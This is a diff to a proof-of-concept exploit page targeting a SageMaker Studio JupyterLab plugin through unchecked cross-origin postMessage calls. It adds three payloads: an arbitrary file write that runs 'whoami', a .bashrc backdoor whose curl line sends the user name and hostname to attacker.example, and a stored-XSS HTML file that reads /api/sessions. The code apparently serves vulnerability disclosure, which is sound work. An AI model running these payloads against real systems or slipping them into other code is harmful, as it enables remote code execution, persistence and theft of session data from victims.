@@ -21,9 +21,9 @@
   <label>Target JupyterLab URL:</label>
   <input id="url" value="https://XXXXX.studio.us-east-2.sagemaker.aws/jupyterlab/default/lab" />
   <label>File path to write:</label>
-  <input id="path" value="../../opt/conda/share/jupyter/labextensions/@jupyterlab/scheduler/static/remoteEntry.53a1b4daacb800efe3a6.js" />
+  <input id="path" value="pwned-by-postmessage.py" />
   <label>File content:</label>
-  <input id="content" value="confirm(2)" />
+  <input id="content" value="# PROOF: This file was written by an attacker-controlled page via cross-origin postMessage.&#10;# The SageMaker doc-manager plugin has no origin validation on its message handler.&#10;import os; print('EXPLOITED — running as:', os.popen('whoami').read())" />
   <label>Wait for Studio to load (ms):</label>
   <input id="wait" value="8000" />
 
@@ -49,25 +49,41 @@ function exploit() {
   setTimeout(function() {
     if (w.closed) { status('Popup was closed.', 'err'); return; }
 
-    // Phase 2: Write arbitrary file via OpenOrCreateFile
+    // Attack 1: Write attacker-controlled file (opens automatically in JupyterLab)
     w.postMessage({
       type: 'sagemaker:nbevent:OpenOrCreateFile',
       payload: { type: 'file', path: path, content: content, format: 'text' }
     }, '*');
-    status('Sent OpenOrCreateFile → ' + path, 'ok');
+    status('[1/3] Wrote ' + path + ' (arbitrary file write)', 'ok');
 
-    // Phase 3: Write stored XSS .html via OpenUntitledFile
+    // Attack 2: Backdoor .bashrc — executes next time victim opens a terminal
+    setTimeout(function() {
+      w.postMessage({
+        type: 'sagemaker:nbevent:OpenOrCreateFile',
+        payload: {
+          type: 'file',
+          path: '.bashrc',
+          content: '# Backdoored via postMessage — no origin check\ncurl https://attacker.example/exfil?user=$(whoami)\\&host=$(hostname)',
+          format: 'text'
+        }
+      }, '*');
+      status('[2/3] Wrote .bashrc (RCE on next terminal open)', 'ok');
+    }, 500);
+
+    // Attack 3: Drop stored XSS .html — auto-opens in JupyterLab
     setTimeout(function() {
       w.postMessage({
         type: 'sagemaker:nbevent:OpenUntitledFile',
         payload: {
           type: 'file', ext: '.html', path: '',
-          content: '<script>document.write("XSS in: "+location.origin)<\/script>',
+          content: '<h1>Stored XSS via postMessage</h1>'
+            + '<script>fetch("/api/sessions").then(r=>r.json()).then(d=>'
+            + 'document.write("<pre>"+JSON.stringify(d,null,2)+"</pre>"))<\/script>',
           format: 'text'
         }
       }, '*');
-      status('Sent OpenUntitledFile → stored XSS .html', 'ok');
-      status('Done. Check popup Network tab for PUT /api/contents/' + path, 'warn');
+      status('[3/3] Wrote untitled .html (stored XSS, leaks /api/sessions)', 'ok');
+      status('Done. All 3 payloads delivered.', 'warn');
     }, 1000);
   }, wait);
 }
